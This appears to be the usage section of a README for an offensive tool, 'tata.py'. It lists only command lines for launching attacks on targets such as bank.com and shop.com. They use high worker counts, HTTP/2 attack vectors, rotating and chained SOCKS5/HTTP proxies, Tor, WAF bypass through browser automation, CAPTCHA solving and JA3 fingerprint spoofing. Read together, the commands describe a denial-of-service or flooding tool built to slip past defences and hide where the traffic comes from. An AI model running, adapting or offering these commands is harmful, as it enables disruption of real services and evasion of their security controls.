Basic Attack (No Proxy)
python3 tata.py --target shop.example.com --port 443 --vectors http2 ghost --workers 500 --duration 120

With SOCKS5 Proxies
python3 tata.py --target api.test.com --proxy-file proxies.txt --proxy-type socks5 --proxy-rotation random --workers 200

With HTTP Proxies & Sticky Session
python3 tata.py --target bank.com --proxy-file http_proxies.txt --proxy-type http --sticky-proxy --duration 60


Proxy Chaining (3 hops)
python3 tata.py --target secure.com --proxy-file premium.txt --proxy-type socks5 --chain-length 3 --proxy-rotation latency-based


WAF Bypass – Browser Automation

# Basic WAF bypass with Chrome
python3 tata.py --target shop.com --waf-bypass --browser-type chrome_120

# Show browser window (debugging)
python3 tata.py --target api.com --waf-bypass --show-browser

# With CAPTCHA solving
python3 tata.py --target bank.com --waf-bypass --captcha-key YOUR_2CAPTCHA_KEY


Full Stealth Mode (Proxies + WAF Bypass + JA3 Spoofing)
python3 tata.py --target secure.com \
    --proxy-file premium.txt \
    --proxy-type socks5 \
    --proxy-rotation random \
    --waf-bypass \
    --browser-type firefox_122 \
    --ja3-spoof \
    --captcha-key YOUR_KEY \
    --duration 300


Tor Mode with WAF Bypass
# Requires Tor running on localhost:9050
python3 tata.py --target darkweb.onion --tor --waf-bypass --browser-type chrome_120
